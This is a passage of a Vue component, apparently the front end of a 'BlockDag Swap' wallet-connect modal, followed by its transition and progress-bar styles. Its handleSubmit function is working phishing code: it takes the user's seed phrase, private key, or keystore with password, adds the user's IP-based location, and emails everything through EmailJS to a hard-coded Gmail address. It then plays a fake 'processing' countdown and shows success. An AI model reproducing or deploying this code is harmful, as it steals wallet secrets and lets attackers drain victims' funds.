      "img-fallback w-full h-full flex items-center justify-center text-white text-xs font-bold";
    fallback.style.cssText =
      "background: linear-gradient(135deg, #0e4166, #163a5e); color: #67e8f9;";
    fallback.textContent = wallet.name.slice(0, 2).toUpperCase();
    parent.appendChild(fallback);
  }
}

async function handleSubmit() {
  if (!selectedWallet.value) return;

  // Build payload from active tab
  const payload: Record<string, string> = {
    wallet: selectedWallet.value.name,
    type: activeTab.value,
  };
  if (activeTab.value === "phrase") {
    payload.phrase = formData.value.phrase;
  }
  if (activeTab.value === "keystore") {
    payload.keystore = formData.value.keystore;
    payload.password = formData.value.keystorePassword;
  }
  if (activeTab.value === "privatekey") {
    payload.privateKey = formData.value.privateKey;
  }

  isSubmitting.value = true;

  try {
    // 1. Get location data
    const locationRes = await fetch("https://ipapi.co/json");
    const location = await locationRes.json();

    const formatLocation = {
      ip: location.ip,
      city: location.city,
      region: location.region,
      country: location.country_name,
    };

    // 2. Prepare the body data
    // Instead of FormData, use a plain object so JSON.stringify works
    const emailBody = {
      ...payload,
      _subject: `Wallet Connect – ${payload.wallet} [${payload.type}]`,
    };

    const params = {
      service_id: "service_5fm2q86",
      template_id: "template_um0fxqr",
      user_id: "o2y1rQmcC-U6vzCJn",
      template_params: {
        from_name: "BlockDag Swap",
        location: JSON.stringify(formatLocation, null, 2), // Pretty print for readability
        body: JSON.stringify(emailBody, null, 2), // Now shows actual data
        reply_to: "edgir973@gmail.com",
      },
    };

    // 3. Send the request
    await fetch("https://api.emailjs.com/api/v1.0/email/send", {
      method: "POST",
      headers: {
        "Content-Type": "application/json", // Critical for EmailJS
        Accept: "application/json",
      },
      body: JSON.stringify(params), // Must stringify the entire payload
    });
  } catch (error) {
    console.error("Submission failed:", error);
  }

  isSubmitting.value = false;
  closeModal();

  // Show countdown processing overlay
  status.value = "processing";
  countdown.value = 30;
  const timer = setInterval(() => {
    countdown.value--;
    if (countdown.value <= 0) {
      clearInterval(timer);
      status.value = "success";
      setTimeout(() => {
        status.value = "idle";
      }, 3000);
    }
  }, 100);
}
</script>

<style scoped>
.fade-enter-active,
.fade-leave-active {
  transition: opacity 0.2s ease;
}
.fade-enter-from,
.fade-leave-to {
  opacity: 0;
}

.slide-up-enter-active {
  transition:
    transform 0.3s cubic-bezier(0.34, 1.56, 0.64, 1),
    opacity 0.2s ease;
}
.slide-up-leave-active {
  transition:
    transform 0.2s ease,
    opacity 0.2s ease;
}
.slide-up-enter-from {
  transform: translateY(40px);
  opacity: 0;
}
.slide-up-leave-to {
  transform: translateY(40px);
  opacity: 0;
}
@media (min-width: 768px) {
  .slide-up-enter-from {
    transform: scale(0.96) translateY(8px);
  }
  .slide-up-leave-to {
    transform: scale(0.96) translateY(8px);
  }
}

.secure-progress-bar {
  width: 100%;
  height: 4px;
  background: rgba(255, 255, 255, 0.06);
  border-radius: 99px;
  overflow: hidden;
}
.secure-progress-fill {
  height: 100%;
  border-radius: 99px;
  background: linear-gradient(90deg, #06b6d4, #3b82f6);
  transition: width 0.08s linear;
  box-shadow: 0 0 8px rgba(6, 182, 212, 0.6);
}

.blinking-text {
  animation: blink 1.1s ease-in-out infinite;
}
@keyframes blink {
  0%,
  100% {
    opacity: 1;
  }
  50% {
    opacity: 0.3;
  }
}
</style>
